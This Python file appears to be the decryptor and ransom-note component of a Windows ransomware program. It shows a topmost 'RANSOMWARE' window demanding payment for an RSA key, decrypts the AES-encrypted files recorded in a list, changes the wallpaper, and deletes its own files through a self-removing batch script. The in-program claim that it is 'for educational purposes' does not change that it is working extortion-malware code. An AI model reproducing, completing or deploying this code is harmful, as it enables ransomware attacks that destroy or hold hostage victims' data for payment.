import os
import ctypes
import sys
import tkinter as tk
from tkinter.filedialog import askopenfilename
import tkinter.messagebox
from Crypto.Cipher import AES
import rsa
import time
import subprocess

absolute_path=os.path.expanduser('~\\chr')
root= tk.Tk()
root.withdraw()

def __import_key(rsa_key_file):

    try:
        elements=list()
        with open(rsa_key_file,"r",encoding="utf-8") as f:
            for line in f:
                if line[-1:]=="\n":
                    line=line[:-1]
                elements.append(int(line))

        with open(os.path.join(absolute_path,"encryptedWithRSA.aeskey"), "rb") as aes_file:
            return rsa.decrypt(aes_file.read(),rsa.PrivateKey(elements[0], elements[1], elements[2], elements[3], elements[4]))

    except:
        return False
    pass

def __decrypt_iv(iv,key):
    cipher = AES.new(key, AES.MODE_ECB)
    return cipher.decrypt(iv)

def __decrypt_files(key_file):
    key = __import_key(key_file)
    failed=list()
    with open(os.path.join(absolute_path,"files.txt"),"r",encoding="utf-8") as f:
        for file in f:
            file=file[:-1]
            if not __decrypt(file,key):
                failed.append(file)

    return failed

def __decrypt(file,key):

    try:
        with open(file, "rb") as encoded_file:
            encoded_iv=encoded_file.read(16)
            encoded_data = encoded_file.read()

        cipher = AES.new(key, AES.MODE_CBC,__decrypt_iv(encoded_iv,key))

        decoded_data = cipher.decrypt(encoded_data)

        with open(file, "wb") as encoded_file:
            encoded_file.write(decoded_data)
    except Exception as e:
        with open(os.path.join(absolute_path,"errors.txt"),"a",encoding="utf-8") as err_file:
            err_file.write("Failed to decrypt {0}: {1}\n".format(str(file), str(e)))
        return False
    return True

def __change_wallpaper(photo_name):

    path=os.path.join(absolute_path,photo_name)
    if os.path.exists(path):
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 0)
        return True
    else:
        return False

def __select_file():
    global root

    decrypt_key_file = askopenfilename(initialdir = os.path.expanduser('~\\Desktop\\'),title = "Select your RSA key",filetypes = [("RSA key file","*.rsakey")])

    if decrypt_key_file=="":
        return

    if tkinter.messagebox.askyesno("Are you sure?",
                                   "Are you sure you want to proceed? \n"
                                   "If your private key is wrong you will lose your files forever."):
        root.withdraw()
        failed=__decrypt_files(decrypt_key_file)
        if len(failed)!=0:
            message=""
            for i in failed:
                message+=str(i)+"\n"
            tkinter.messagebox.showwarning("Files cannot be decrypted",message)
        root.destroy()
        __suicide()
    return

def __delete_file(file):
    try:
        os.remove(file)
    except:
        pass
    return

def __suicide():
    __change_wallpaper("1.png")
    time.sleep(2)
    __delete_file(os.path.join(absolute_path, "files.txt"))
    __delete_file(os.path.join(absolute_path, "errors.txt"))
    __delete_file(os.path.join(absolute_path, "encryptedWithRSA.aeskey"))
    __delete_file(os.path.expanduser("~\\Desktop\\simple_private.rsakey"))
    __delete_file(os.path.expanduser("~\\Desktop\\Decryptor.lnk"))
    __delete_file(os.path.join(absolute_path, "simple_private.rsakey"))
    __delete_file(os.path.join(absolute_path, "Decryptor.lnk"))
    __delete_file(os.path.join(absolute_path, "0.png"))
    __delete_file(os.path.join(absolute_path, "1.png"))

    with open(os.path.join(absolute_path,"end.bat"),"w") as f:
        f.write("@echo off\ntimeout 5 >NUL\ndel /Q \"%userprofile%\\chr\\decryptor.exe\"\ndel /Q \"%userprofile%\\chr\\end.bat\"")
    time.sleep(2)
    subprocess.Popen([os.path.join(absolute_path,"end.bat")])
    sys.exit()
    pass

# -
try:
    with open(os.path.join(absolute_path,"temp"),"r") as f:
        name=f.read()
    __delete_file(str(name))
    __delete_file(os.path.join(absolute_path,"temp"))
except:
    pass

root.deiconify()
root.geometry("855x200")
root.title("RANSOMWARE")
root.configure(bg="red")
root.resizable(False, False)
root.lift()
root.attributes('-topmost', True)

label = tk.Label(root, text="---What happened?---\nYour files are encrypted with "
                            "AES-256bit and the key is encrypted with RSA-2048bit. "
                            "Thus without our private key you cannot obtain your key to decrypt your files."
                            "\n---What can I do?---\nYou can contact with us to give you the private key. We will arrange"
                            " the payment and we will give you the key.\nAs a proof we have the key we can"
                            " decrypt one file for free. Attach in first email the key file you will found"
                            " in your desktop and the file you want\n---Is this a real virus?---\nOf course not! This"
                            " program is made for educational purposes so in your desktop you will find a txt file "
                            "with your RSA private key. ",bg="#b30000").place(x=0,y=0)
button = tk.Button(root, text="\nSelect RSA key file and Start Decryption\n",bg="green",fg="white",bd="10",activebackground="blue",command=__select_file).place(x=311,y=121)
root.mainloop()